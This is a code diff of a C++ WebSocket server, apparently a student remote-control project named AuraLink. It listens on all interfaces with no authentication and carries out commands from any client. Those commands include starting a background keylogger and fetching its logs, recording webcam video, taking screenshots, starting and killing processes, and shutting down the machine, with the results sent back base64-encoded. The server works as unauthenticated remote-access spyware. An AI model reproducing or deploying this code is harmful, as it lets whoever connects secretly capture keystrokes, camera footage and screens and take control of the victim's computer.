@@ -7,22 +7,25 @@
 #include <boost/beast/websocket.hpp>
 #include <boost/asio/ip/tcp.hpp>
 #include <boost/asio/strand.hpp>
-#include <cstdlib>      // Thu vien chua ham system() de chay lenh CMD
+#include <cstdlib>      
 #include <iostream>
 #include <string>
 #include <thread>
 #include <memory>
 #include <vector>
-#include<fstream>
+#include <fstream>
+#include <windows.h>    
 
+// Cac module chuc nang
 #include "Process.h"
 #include "Keylogger.h"
 #include "Webcam.h"
-#include"Application.h"
-#include"ScreenShot.h"
+#include "Application.h"
+#include "ScreenShot.h"
 
-// Tu dong link thu vien socket cua Windows
+// Link thu vien Windows
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 namespace beast = boost::beast;
 namespace http = beast::http;
@@ -30,7 +33,11 @@ namespace websocket = beast::websocket;
 namespace net = boost::asio;
 using tcp = boost::asio::ip::tcp;
 
-// --- HAM HO TRO MA HOA BASE64 ---
+// =============================================================
+// PHAN 1: CAC HAM HO TRO (HELPER FUNCTIONS)
+// =============================================================
+
+// 1. Ma hoa Base64 (De gui file video/anh qua socket)
 static const std::string base64_chars =
 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 "abcdefghijklmnopqrstuvwxyz"
@@ -66,315 +73,278 @@ std::string base64_encode(const std::vector<char>& data) {
     return ret;
 }
 
-//------------------------------------------------------------------------------
-// MODULE 2
-//------------------------------------------------------------------------------
+// 2. Lay Ten May Tinh (Hostname)
+std::string GetComputerNameStr() {
+    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(buffer);
+    if (GetComputerNameA(buffer, &size)) {
+        return std::string(buffer);
+    }
+    return "Unknown-PC";
+}
 
+// 3. Lay Ten He Dieu Hanh (Doc Registry de phan biet Win 10/11)
+std::string GetOSVersionStr() {
+    std::string osName = "Unknown Windows";
+    HKEY hKey;
+
+    // Mo Registry chua thong tin Windows
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char productName[255] = { 0 };
+        DWORD dataSize = sizeof(productName);
+
+        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
+            osName = std::string(productName);
+        }
+
+        char currentBuild[32] = { 0 };
+        dataSize = sizeof(currentBuild);
+        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)currentBuild, &dataSize) == ERROR_SUCCESS) {
+            int buildNumber = std::atoi(currentBuild);
+            if (buildNumber >= 22000) {
+                size_t pos = osName.find("Windows 10");
+                if (pos != std::string::npos) {
+                    osName.replace(pos, 10, "Windows 11");
+                }
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    return osName;
+}
+
+// Khai bao ham Shutdown/Restart (Dinh nghia o file khac hoac duoi cung)
 void DoShutdown();
 void DoRestart();
 
-//------------------------------------------------------------------------------
-// LOGIC SERVER
-//------------------------------------------------------------------------------
-
-// Ham bao loi ra man hinh
-void fail(beast::error_code ec, char const* what)
-{
+// Ham bao loi
+void fail(beast::error_code ec, char const* what) {
     std::cerr << what << ": " << ec.message() << "\n";
 }
 
-// Class dai dien cho mot phien ket noi (1 Client)
+// =============================================================
+// PHAN 2: XU LY KET NOI (SESSION)
+// =============================================================
+
 class session : public std::enable_shared_from_this<session>
 {
     websocket::stream<beast::tcp_stream> ws_;
-    beast::flat_buffer buffer_; // Bo dem chua du lieu nhan duoc
+    beast::flat_buffer buffer_;
 
 public:
-    // Constructor: Nhan socket tu listener
-    explicit session(tcp::socket&& socket)
-        : ws_(std::move(socket))
-    {
-    }
+    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
 
-    // Bat dau chay phien lam viec
-    void run()
-    {
-        // Thiet lap timeout (de phong treo ket noi)
+    void run() {
         ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
-
-        // Thuc hien bat tay WebSocket (Handshake)
-        ws_.async_accept(
-            beast::bind_front_handler(
-                &session::on_accept,
-                shared_from_this()));
+        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
     }
 
-    void on_accept(beast::error_code ec)
-    {
+    void on_accept(beast::error_code ec) {
         if (ec) return fail(ec, "Accept Error");
-
-        // Bat tay xong, bat dau doc tin nhan
         do_read();
     }
 
-    void do_read()
-    {
-        // Doc tin nhan tu Client vao buffer_
-        ws_.async_read(
-            buffer_,
-            beast::bind_front_handler(
-                &session::on_read,
-                shared_from_this()));
+    void do_read() {
+        ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
     }
 
-    // --- XU LY TIN NHAN NHAN DUOC ---
+    // --- TRUNG TAM XU LY LENH TU CLIENT ---
     void on_read(beast::error_code ec, std::size_t bytes_transferred)
     {
         boost::ignore_unused(bytes_transferred);
-
-        // Neu client ngat ket noi
         if (ec == websocket::error::closed) return;
         if (ec) return fail(ec, "Read Error");
 
-        // Kiem tra xem tin nhan co phai la dang Text khong
         if (ws_.got_text())
         {
-            // Chuyen du lieu tu Buffer sang String
             std::string command = beast::buffers_to_string(buffer_.data());
-
             std::cout << "RECEIVED COMMAND: " << command << "\n";
+
             static Keylogger myKeylogger;
             static Process myProcessModule;
             static Application myAppModule;
 
-            // Xu ly lenh 
-            // 1. Xu ly Shutdown
-            if (command == "shutdown")
+            // -------------------------------------------------
+            // NHOM 1: SYSTEM INFO & POWER
+            // -------------------------------------------------
+
+            // Lay thong tin may (Hostname, OS)
+            if (command == "get-sys-info")
+            {
+                std::string hostname = GetComputerNameStr();
+                std::string os = GetOSVersionStr();
+                std::string response = "sys-info " + hostname + "|" + os;
+
+                ws_.text(true);
+                ws_.write(net::buffer(response));
+                std::cout << "[SERVER] Sent Info: " << hostname << " | " << os << "\n";
+            }
+            // Shutdown
+            else if (command == "shutdown")
             {
                 ws_.text(true);
                 ws_.write(net::buffer("Server: OK, shutting down in 15s..."));
                 DoShutdown();
             }
-            // 2. Xu ly Restart
+            // Restart
             else if (command == "restart")
             {
                 ws_.text(true);
                 ws_.write(net::buffer("Server: OK, restarting in 15s..."));
                 DoRestart();
             }
-            // 3. Xu ly Capture Webcam
+
+            // -------------------------------------------------
+            // NHOM 2: MEDIA (WEBCAM & SCREENSHOT)
+            // -------------------------------------------------
+
+            // Capture Webcam (10s)
             else if (command == "capture")
             {
-                // Thong bao truoc de Client khong tuong bi treo
                 ws_.text(true);
                 ws_.write(net::buffer("Server: OK, recording video (10s)... Please wait."));
 
-                // Quay video (Mat 10 giay)
                 std::vector<char> videoData = CaptureWebcam(10);
 
                 if (!videoData.empty()) {
-                    // Ma hoa Base64
                     std::string encoded = base64_encode(videoData);
-
-                    // Gui ve Client voi tien to "file"
-                    // De Client JS hieu va tai xuong
                     std::string response = "file " + encoded;
-
                     ws_.text(true);
                     ws_.write(net::buffer(response));
-                    std::cout << "[SERVER] Video sent to Client.\n";
+                    std::cout << "[SERVER] Video sent.\n";
                 }
                 else {
                     ws_.text(true);
                     ws_.write(net::buffer("Server: Error recording video."));
                 }
             }
+            // Screenshot
+            else if (command == "screenshot")
+            {
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Capturing screenshot..."));
 
-            // 4. Xu li Keylogger
+                int width = GetSystemMetrics(SM_CXSCREEN);
+                int height = GetSystemMetrics(SM_CYSCREEN);
+                std::vector<std::uint8_t> pixels = ScreenShot();
+
+                if (pixels.empty()) {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Error capturing screenshot."));
+                }
+                else {
+                    std::vector<char> bytes(pixels.begin(), pixels.end());
+                    std::string encoded = base64_encode(bytes);
+                    std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
+                    ws_.text(true);
+                    ws_.write(net::buffer(response));
+                }
+            }
+
+            // -------------------------------------------------
+            // NHOM 3: KEYLOGGER
+            // -------------------------------------------------
+
             else if (command == "start-keylog")
             {
                 myKeylogger.StartKeyLogging();
                 ws_.text(true);
-                ws_.write(net::buffer("Server: Keylogger da bat dau (chay ngam)..."));
+                ws_.write(net::buffer("Server: Keylogger started (background)..."));
             }
             else if (command == "stop-keylog")
             {
                 myKeylogger.StopKeyLogging();
                 ws_.text(true);
-                ws_.write(net::buffer("Server: Keylogger da dung lai."));
+                ws_.write(net::buffer("Server: Keylogger stopped."));
             }
             else if (command == "get-keylog")
             {
-                // Lay du lieu phim da ghi duoc
                 std::string logs = myKeylogger.GetLoggedKeys();
-
-                if (logs.empty()) logs = "[Chua co phim nao duoc go]";
-
+                if (logs.empty()) logs = "[No keys recorded]";
                 ws_.text(true);
-                // Gui du lieu ve Client
                 ws_.write(net::buffer("KEYLOG_DATA:\n" + logs));
             }
-            // 5. Xu li Process
-             // Lenh "ps": Liet ke danh sach process
+
+            // -------------------------------------------------
+            // NHOM 4: PROCESSES
+            // -------------------------------------------------
+
+            // List Process
             else if (command == "ps")
             {
                 std::string list = myProcessModule.ListProcesses();
                 ws_.text(true);
-                // Gui danh sach ve cho Client
                 ws_.write(net::buffer(list));
             }
-            // Lenh "start <ten app>": Mo chuong trinh
-            // Vi du: start notepad.exe
+            // Start Process
             else if (command.rfind("start ", 0) == 0)
             {
-                // Cat bo chu "start " (6 ky tu dau) de lay ten app
                 std::string appName = command.substr(6);
-
                 if (myProcessModule.StartProcess(appName)) {
                     ws_.text(true);
-                    ws_.write(net::buffer("Server: Da mo thanh cong: " + appName));
+                    ws_.write(net::buffer("Server: Started successfully: " + appName));
                 }
                 else {
                     ws_.text(true);
-                    ws_.write(net::buffer("Server: Loi! Khong the mo: " + appName));
+                    ws_.write(net::buffer("Server: Error! Could not start: " + appName));
                 }
             }
-            // Lenh "kill <ten app hoac PID>": Tat chuong trinh
-            // Vi du: kill notepad.exe HOAC kill 1234
+            // Kill Process
             else if (command.rfind("kill ", 0) == 0)
             {
-                // Cat bo chu "kill " (5 ky tu dau) de lay ten app/PID
                 std::string target = command.substr(5);
-
-                // Goi ham Stop va lay thong bao loi/thanh cong tra ve
                 std::string result = myProcessModule.StopProcess(target);
-
                 ws_.text(true);
                 ws_.write(net::buffer("Server: " + result));
             }
-            // 6. Xu ly Application (List / Start / Stop)
 
-            // 6.1. Liet ke cac ung dung da cai (doc tu Registry)
-            else if (command == "list-app")
+            // -------------------------------------------------
+            // NHOM 5: APPLICATIONS (Registry)
+            // -------------------------------------------------
+
+            // List Apps
+            else if (command == "list-apps" || command == "list-app")
             {
-                // Load danh sach ung dung tu Registry
                 auto apps = myAppModule.LoadInstalledApplications();
-
                 ws_.text(true);
-
-                if (apps.empty())
-                {
-                    ws_.write(net::buffer("Server: Khong tim thay ung dung nao trong Registry."));
+                if (apps.empty()) {
+                    ws_.write(net::buffer("Server: No applications found."));
                 }
-                else
-                {
-                    std::string msg = "DANH SACH UNG DUNG DA CAI:\n";
-
-                    // Chi hien toi da 50 dong cho nhe
+                else {
+                    std::string msg = "INSTALLED APPLICATIONS:\n";
                     size_t maxShow = std::min<std::size_t>(apps.size(), 50);
-
-                    for (size_t i = 0; i < maxShow; ++i)
-                    {
-                        const auto& app = apps[i];
-                        msg += "[" + std::to_string(i) + "] " + app.name + "\n";
-                        msg += "    Id:  " + app.id + "\n";
-                        msg += "    Exe: " + app.command + "\n\n";
+                    for (size_t i = 0; i < maxShow; ++i) {
+                        msg += "[" + std::to_string(i) + "] " + apps[i].name + "\n";
                     }
-
-                    if (apps.size() > maxShow)
-                    {
-                        msg += "... (" + std::to_string(apps.size() - maxShow)
-                            + " ung dung khac khong hien het)\n";
-                    }
-
                     ws_.write(net::buffer(msg));
                 }
             }
-
-            // 6.2. Start Application
-            // Lenh: "app-start <ten app hoac exe>"
+            // Start App
             else if (command.rfind("start-app ", 0) == 0)
             {
-                const std::string prefix = "start-app ";
-                std::string input = command.substr(prefix.size()); // phan sau "app-start "
-
-                // Cap nhat danh sach ung dung (de StartApplicationFromInput biet cac DisplayName)
+                std::string input = command.substr(10);
                 myAppModule.LoadInstalledApplications();
-
-                bool ok = myAppModule.StartApplicationFromInput(input);
-
-                ws_.text(true);
-                if (ok)
-                {
-                    ws_.write(net::buffer("Server: Da mo ung dung: " + input));
+                if (myAppModule.StartApplicationFromInput(input)) {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Launched application: " + input));
                 }
-                else
-                {
-                    ws_.write(net::buffer("Server: Khong the mo ung dung: " + input));
+                else {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Could not launch application: " + input));
                 }
             }
-
-            // 6.3. Stop Application
-            // Lenh: "app-stop <DisplayName>"
+            // Stop App
             else if (command.rfind("stop-app ", 0) == 0)
             {
-                const std::string prefix = "stop-app ";
-                std::string input = command.substr(prefix.size()); // phan sau "stop-app "
-
-                // Cap nhat danh sach ung dung moi nhat
+                std::string input = command.substr(9);
                 myAppModule.LoadInstalledApplications();
-
-                bool ok = myAppModule.StopApplicationByName(input);
-
-                ws_.text(true);
-                if (ok)
-                {
-                    ws_.write(net::buffer(
-                        "Server: Da dung ung dung (hoac khong co process nao dang chay): " + input));
-                }
-                else
-                {
-                    ws_.write(net::buffer(
-                        "Server: Khong tim thay ung dung trong danh sach: " + input));
-                }
-            }
-            else if (command == "screenshot")
-            {
-                ws_.text(true);
-                ws_.write(net::buffer("Server: OK, capturing screenshot..."));
-
-                // Kích thước màn hình – phải trùng với bên ScreenShot.cpp
-                int width = GetSystemMetrics(SM_CXSCREEN);
-                int height = GetSystemMetrics(SM_CYSCREEN);
-
-                // Gọi hàm ScreenShot() trong ScreenShot.cpp
-                // Trả về buffer BGRA 32-bit: size = width * height * 4
-                std::vector<std::uint8_t> pixels = ScreenShot();
-
-                if (pixels.empty())
-                {
+                if (myAppModule.StopApplicationByName(input)) {
                     ws_.text(true);
-                    ws_.write(net::buffer("Server: Error capturing screenshot."));
+                    ws_.write(net::buffer("Server: Stopped application: " + input));
                 }
-                else
-                {
-                    // Đổi sang vector<char> để dùng lại base64_encode(const std::vector<char>&)
-                    std::vector<char> bytes(pixels.begin(), pixels.end());
-                    std::string encoded = base64_encode(bytes);
-
-                    // Gửi cho client:
-                    //  screenshot <w> <h> <base64_raw_bgra>
-                    std::string response =
-                        "screenshot " +
-                        std::to_string(width) + " " +
-                        std::to_string(height) + " " +
-                        encoded;
-
+                else {
                     ws_.text(true);
-                    ws_.write(net::buffer(response));
-
-                    std::cout << "[SERVER] Screenshot (" << width << "x" << height
-                        << ") sent to Client.\n";
+                    ws_.write(net::buffer("Server: Application not found: " + input));
                 }
             }
             else
@@ -383,18 +353,15 @@ public:
                 ws_.write(net::buffer("Server: Unknown command!"));
             }
         }
-
-        // Xoa bo dem cu de chuan bi nhan tin moi
         buffer_.consume(buffer_.size());
-
-        // Tiep tuc vong lap doc
         do_read();
     }
 };
 
-//------------------------------------------------------------------------------
+// =============================================================
+// PHAN 3: MAIN & LISTENER
+// =============================================================
 
-// Class lang nghe ket noi moi (Cong bao ve)
 class listener : public std::enable_shared_from_this<listener>
 {
     net::io_context& ioc_;
@@ -405,74 +372,43 @@ public:
         : ioc_(ioc), acceptor_(ioc)
     {
         beast::error_code ec;
-
-        // Mo cong
         acceptor_.open(endpoint.protocol(), ec);
         if (ec) { fail(ec, "Open Error"); return; }
-
-        // Cho phep dung lai dia chi IP
         acceptor_.set_option(net::socket_base::reuse_address(true), ec);
         if (ec) { fail(ec, "Set Option Error"); return; }
-
-        // Gan dia chi IP vao cong
         acceptor_.bind(endpoint, ec);
         if (ec) { fail(ec, "Bind Error"); return; }
-
-        // Bat dau lang nghe
         acceptor_.listen(net::socket_base::max_listen_connections, ec);
         if (ec) { fail(ec, "Listen Error"); return; }
     }
 
-    // Bat dau chap nhan ket noi
     void run() { do_accept(); }
 
 private:
-    void do_accept()
-    {
-        // Cho ket noi moi bat dong bo
-        acceptor_.async_accept(
-            net::make_strand(ioc_),
-            beast::bind_front_handler(
-                &listener::on_accept,
-                shared_from_this()));
+    void do_accept() {
+        acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this()));
     }
 
-    void on_accept(beast::error_code ec, tcp::socket socket)
-    {
-        if (ec)
-        {
-            fail(ec, "Accept Error");
-        }
-        else
-        {
-            // Tao phien lam viec moi (Session) cho ket noi nay
-            std::make_shared<session>(std::move(socket))->run();
-        }
-
-        // Quay lai cho ket noi tiep theo
+    void on_accept(beast::error_code ec, tcp::socket socket) {
+        if (ec) fail(ec, "Accept Error");
+        else std::make_shared<session>(std::move(socket))->run();
         do_accept();
     }
 };
 
-//------------------------------------------------------------------------------
-
 int main()
 {
+    // Lang nghe moi dia chi IP (0.0.0.0) de may khac trong LAN ket noi duoc
     auto const address = net::ip::make_address("0.0.0.0");
     auto const port = static_cast<unsigned short>(8080);
     int const threads = 1;
 
-    std::cout << "Starting WebSocket server...\n";
+    std::cout << "Starting AuraLink Server...\n";
     std::cout << "Listening on ws://" << address.to_string() << ":" << port << "\n";
     std::cout << "----------------------------------\n";
 
-    // Tao moi truong I/O
     net::io_context ioc{ threads };
-
-    // Tao va chay listener
     std::make_shared<listener>(ioc, tcp::endpoint{ address, port })->run();
-
-    // Chay vong lap su kien (Event Loop)
     ioc.run();
 
     return EXIT_SUCCESS;
